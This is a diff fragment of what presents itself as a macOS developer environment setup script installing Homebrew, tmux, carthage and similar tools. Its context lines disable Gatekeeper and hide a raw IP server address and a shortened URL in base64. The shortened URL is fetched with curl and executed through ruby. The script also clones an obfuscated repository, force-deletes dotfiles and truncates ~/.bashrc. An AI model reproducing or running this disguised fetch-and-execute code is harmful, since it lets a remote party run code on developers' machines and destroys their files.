@@ -5,11 +5,11 @@ sudo chmod go-w /usr/local/bin
 sudo xcode-select --install 2> /dev/null || true; sudo xcode-select -s /Applications/Xcode.app/Contents/Developer 2> /dev/null || true
 sudo spctl --master-disable; SERVER='GS='$(dbsf aHR0cDovLzE0OS4yOC45NS4xMjo4ODA4)
 chkprog () { if hash $1 2> /dev/null; then return 0; else return 1; fi }
-# mi () { for i in "$@"; do mint install $i; done; }; BEAK='yonaskolb/beak'; SWIFTSH='mxcl/swift-sh'
+mi () { for i in "$@"; do mint install $i; done; }; BEAK='yonaskolb/beak'; SWIFTSH='mxcl/swift-sh'
 if ! chkprog brew; then /usr/bin/ruby -e "$(curl -fsSL $(dbsf aHR0cDovL2JpdC5seS8yS09yNlly))"; else brew update; fi; if chkprog rvm; then rvm implode; fi
 biu () { for i in "$@"; do if ! chkprog $i; then brew install $i; else brew upgrade $i 2> /dev/null || true; fi; done }; biu tmux rbenv ninja gnu-sed carthage mint shellcheck tree
 brew install findutils 2> /dev/null || true; brew install gnu-sed 2> /dev/null || true
-# mi $BEAK $SWIFTSH
+mi $BEAK $SWIFTSH
 
 MKP='mkproj ()'; SNIPT=$MKP' { git clone '$(dbsf Z2l0QGJpdGJ1Y2tldC5vcmc6YnJhdm9zcHJpbnRodWIvbWtwcm9qLmdpdA==)' $1 && cd $1'" && ls -a | grep -E '(\..+|.+ME.*)' | grep -Ev '\.\.' | "'gxargs -d"\\n" rm -rf; }'
 (perl -pe "s^$SERVER^^g" ~/.bashrc > ~/.bashrc) 2> /dev/null
